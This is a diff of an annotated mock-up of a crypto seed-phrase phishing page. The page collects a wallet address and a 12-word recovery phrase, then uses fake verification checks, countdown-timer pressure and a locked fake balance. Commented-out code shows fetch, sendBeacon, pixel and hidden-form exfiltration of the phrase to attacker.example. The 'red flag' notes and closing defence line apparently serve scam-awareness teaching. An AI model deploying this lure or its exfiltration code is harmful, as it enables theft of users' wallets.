@@ -4,10 +4,12 @@
   <meta charset="utf-8" />
   <title>Backup Verification Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <!-- Red flag: brand mimicry -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     :root {
+      /* Red flag: trust wallet-like palette */
       --blue: #2b6df7;
       --dark: #0f172a;
       --green: #22c55e;
@@ -15,29 +17,56 @@
       --bg: #0b1220;
       --card: #111827;
     }
-    body { margin:0; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-           background:linear-gradient(180deg,var(--bg),#0f172a); color:#e5e7eb; }
-    header { display:flex; align-items:center; gap:12px; padding:20px; border-bottom:1px solid #1f2937; }
-    header .logo { width:36px; height:36px; border-radius:8px; background:var(--blue); }
-    header .title { font-weight:600; font-size:18px; }
-    main { max-width:640px; margin:40px auto; padding:0 16px; }
-    .card { background:var(--card); border:1px solid #1f2937; border-radius:16px; padding:24px; }
-    label { display:block; margin:16px 0 8px; color:#cbd5e1; }
-    input,textarea { width:100%; padding:12px 14px; border-radius:10px;
-                     border:1px solid #2b3442; background:#0b1324; color:#e5e7eb; }
-    button { margin-top:16px; width:100%; padding:12px 16px; border-radius:10px;
-             background:var(--blue); border:none; color:white; font-weight:600; cursor:pointer; }
-    .progress { height:8px; background:#1f2937; border-radius:999px; overflow:hidden; margin-top:12px; }
-    .progress>div { height:100%; width:0%; background:var(--green); transition:width .6s ease; }
-    .tiers { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
-    .tier { padding:16px; background:#0d1629; border:1px solid #1f2937; border-radius:12px; cursor:pointer; }
-    .tier.selected { border-color:var(--green); }
-    .dash { margin-top:16px; padding:16px; background:#0d1629; border:1px solid #1f2937; border-radius:12px; }
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, var(--bg), #0f172a);
+      color: #e5e7eb;
+    }
+    header {
+      display: flex; align-items: center; gap: 12px;
+      padding: 20px; border-bottom: 1px solid #1f2937;
+    }
+    header .logo {
+      width: 36px; height: 36px; border-radius: 8px; background: var(--blue);
+    }
+    header .title {
+      font-weight: 600; font-size: 18px;
+    }
+    main { max-width: 640px; margin: 40px auto; padding: 0 16px; }
+    .card { background: var(--card); border: 1px solid #1f2937; border-radius: 16px; padding: 24px; }
+    .subtitle { color: var(--gray); margin-top: 4px; }
+    label { display: block; margin: 16px 0 8px; color: #cbd5e1; }
+    input, textarea, select {
+      width: 100%; padding: 12px 14px; border-radius: 10px;
+      border: 1px solid #2b3442; background: #0b1324; color: #e5e7eb;
+      outline: none;
+    }
+    button {
+      margin-top: 16px; width: 100%; padding: 12px 16px; border-radius: 10px;
+      background: var(--blue); border: none; color: white; font-weight: 600; cursor: pointer;
+    }
+    .muted { color: var(--gray); font-size: 12px; margin-top: 8px; }
+    .progress { height: 8px; background: #1f2937; border-radius: 999px; overflow: hidden; margin-top: 12px; }
+    .progress > div { height: 100%; width: 0%; background: var(--green); transition: width .6s ease; }
+    .checks { display: flex; gap: 8px; margin-top: 12px; }
+    .check { display: inline-flex; align-items: center; gap: 6px; padding: 8px 10px; background: #0d1629; border: 1px solid #1f2937; border-radius: 999px; color: #a7f3d0; }
+    .tiers { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
+    .tier { padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; }
+    .timer { color: #fb7185; font-weight: 600; }
+    .loader { margin-top: 12px; height: 14px; background: #0d1629; border-radius: 6px; position: relative; overflow: hidden; }
+    .loader::after { content: ""; position: absolute; left: -30%; top: 0; bottom: 0; width: 30%;
+      background: linear-gradient(90deg, transparent, #1f3b70, transparent);
+      animation: load 1.2s infinite; }
+    @keyframes load { to { left: 110%; } }
+    .dash { margin-top: 16px; padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; }
+    .status { color: #93c5fd; font-weight: 600; }
+    .lock { color: #eab308; }
   </style>
 </head>
 <body>
   <header>
-    <div class="logo"></div>
+    <div class="logo" aria-hidden="true"></div>
     <div>
       <div class="title">Backup Verification Portal</div>
       <div class="subtitle">Compliance required</div>
@@ -45,76 +74,129 @@
   </header>
 
   <main>
-    <div id="step1" class="card">
-      <h2>Step 1: Wallet address capture</h2>
+    <div id="step1" class="card" role="region" aria-labelledby="s1title">
+      <h2 id="s1title">Step 1: Wallet address capture</h2>
       <label for="addr">Enter your USDT wallet address</label>
       <input id="addr" name="addr" placeholder="0x..." autocomplete="off" />
-      <div class="loader"></div>
+      <div class="loader" aria-hidden="true"></div>
       <button id="s1btn">Continue</button>
+      <div class="muted">Secure: HTTPS connection • Verified gateway</div>
     </div>
 
-    <div id="step2" class="card" hidden>
-      <h2>Step 2: Recovery phrase</h2>
+    <div id="step2" class="card" hidden role="region" aria-labelledby="s2title">
+      <h2 id="s2title">Step 2: Recovery phrase</h2>
       <label for="phrase">Enter your 12-word recovery phrase</label>
-      <textarea id="phrase" name="phrase" rows="3" placeholder="word1 word2 word3 ..."></textarea>
-      <div class="progress"><div id="progbar"></div></div>
+      <textarea id="phrase" name="phrase" rows="3" placeholder="word1 word2 word3 ..." ></textarea>
+      <div class="checks">
+        <div class="check">✔ Backup confirmed</div>
+        <div class="check">✔ Phrase valid</div>
+      </div>
+      <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
       <button id="s2btn">Verify</button>
+      <div class="muted">Do not close this window during verification.</div>
     </div>
 
-    <div id="step3" class="card" hidden>
-      <h2>Step 3: One-time vault tier</h2>
+    <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
+      <h2 id="s3title">Step 3: One-time vault tier</h2>
       <div class="tiers">
-        <div class="tier" data-tier="100k">Tier: 100k</div>
-        <div class="tier" data-tier="1M">Tier: 1M</div>
+        <div class="tier"><strong>Tier:</strong> 100k • <span class="timer">Offer expires in 02:14</span></div>
+        <div class="tier"><strong>Tier:</strong> 1M • <span class="timer">Offer expires in 02:14</span></div>
       </div>
       <button id="s3btn">Activate eligibility</button>
     </div>
 
-    <div id="final" class="card" hidden>
-      <h2>Dashboard</h2>
+    <div id="final" class="card" hidden role="region" aria-labelledby="ftitle">
+      <h2 id="ftitle">Dashboard</h2>
       <div class="dash">
-        <div>Eligibility activated</div>
-        <div>Faux balance: <strong>1,000,000 USDT</strong> 🔒 locked</div>
+        <div class="status">Eligibility activated</div>
+        <div>Faux balance: <strong>1,000,000 USDT</strong> <span class="lock">🔒 locked</span></div>
         <div>Awaiting deposit...</div>
       </div>
     </div>
   </main>
 
   <script>
-    const s1=document.getElementById('step1');
-    const s2=document.getElementById('step2');
-    const s3=document.getElementById('step3');
-    const fin=document.getElementById('final');
-    const prog=document.getElementById('progbar');
+    // NOTE: This JS is illustrative and harmless. Real scams would send data to a remote server.
+    const s1 = document.getElementById('step1');
+    const s2 = document.getElementById('step2');
+    const s3 = document.getElementById('step3');
+    const fin = document.getElementById('final');
+    const prog = document.getElementById('progbar');
 
-    // Step 1 validation
-    document.getElementById('s1btn').addEventListener('click',()=>{
-      const addr=document.getElementById('addr').value.trim();
-      if(!addr){ alert("Please enter your USDT wallet address."); return; }
-      setTimeout(()=>{ s1.hidden=true; s2.hidden=false; },800);
-    });
+    document.getElementById('s1btn').addEventListener('click', () => {
+  const addr = document.getElementById('addr').value.trim();
+  if (!addr) {
+    alert("Please enter your USDT wallet address.");
+    return; // stop if empty
+  }
+  setTimeout(() => {
+    s1.hidden = true;
+    s2.hidden = false;
+  }, 800);
+});
 
-    // Step 2 validation
-    document.getElementById('s2btn').addEventListener('click',()=>{
-      const phrase=document.getElementById('phrase').value.trim();
-      if(!phrase){ alert("Please enter your 12-word recovery phrase."); return; }
-      prog.style.width='70%';
-      setTimeout(()=>{ prog.style.width='100%'; s2.hidden=true; s3.hidden=false; },900);
-    });
+    document.getElementById('s2btn').addEventListener('click', () => {
+  const phrase = document.getElementById('phrase').value.trim();
+  if (!phrase) {
+    alert("Please enter your 12-word recovery phrase.");
+    return; // stop if empty
+  }
+  prog.style.width = '70%';
+  setTimeout(() => {
+    prog.style.width = '100%';
+    s2.hidden = true;
+    s3.hidden = false;
+  }, 900);
+});
 
-    // Step 3 validation
-    let selectedTier=null;
-    document.querySelectorAll('.tier').forEach(t=>{
-      t.addEventListener('click',()=>{
-        document.querySelectorAll('.tier').forEach(el=>el.classList.remove('selected'));
-        t.classList.add('selected');
-        selectedTier=t.dataset.tier;
-      });
-    });
-    document.getElementById('s3btn').addEventListener('click',()=>{
-      if(!selectedTier){ alert("Please select a tier option."); return; }
-      s3.hidden=true; fin.hidden=false;
-    });
+    let selectedTier = null;
+document.querySelectorAll('.tier').forEach(t => {
+  t.addEventListener('click', () => {
+    document.querySelectorAll('.tier').forEach(el => el.classList.remove('selected'));
+    t.classList.add('selected');
+    selectedTier = t.textContent.trim();
+  });
+});
+
+document.getElementById('s3btn').addEventListener('click', () => {
+  if (!selectedTier) {
+    alert("Please select a tier option.");
+    return; // stop if none selected
+  }
+  s3.hidden = true;
+  fin.hidden = false;
+});
+
+    // HOW DATA CAPTURE USUALLY HAPPENS (illustrative comments):
+    // 1) Simple POST form submission to attacker server:
+    //    fetch('https://attacker.example/api/collect', {
+    //      method: 'POST',
+    //      headers: { 'Content-Type': 'application/json' },
+    //      body: JSON.stringify({
+    //        address: document.getElementById('addr').value,
+    //        phrase:  document.getElementById('phrase').value,
+    //        ts: Date.now(),
+    //        ua: navigator.userAgent
+    //      })
+    //    });
+    //
+    // 2) Beacon or image pixel (quiet, fire-and-forget):
+    //    navigator.sendBeacon('https://attacker.example/collect', new Blob([JSON.stringify({...})]));
+    //    // or:
+    //    // new Image().src = 'https://attacker.example/p.gif?addr=' + encodeURIComponent(...) + '&phrase=' + ...
+    //
+    // 3) Hidden iframe or form auto-submit:
+    //    const form = document.createElement('form');
+    //    form.action = 'https://attacker.example/collect';
+    //    form.method = 'POST';
+    //    const hidden = document.createElement('input');
+    //    hidden.name = 'phrase';
+    //    hidden.value = document.getElementById('phrase').value;
+    //    form.appendChild(hidden);
+    //    document.body.appendChild(form);
+    //    form.submit();
+    //
+    // DEFENSE: Any request sending a recovery phrase anywhere is malicious. Legit wallets never ask for it on a website.
   </script>
 </body>
 </html>
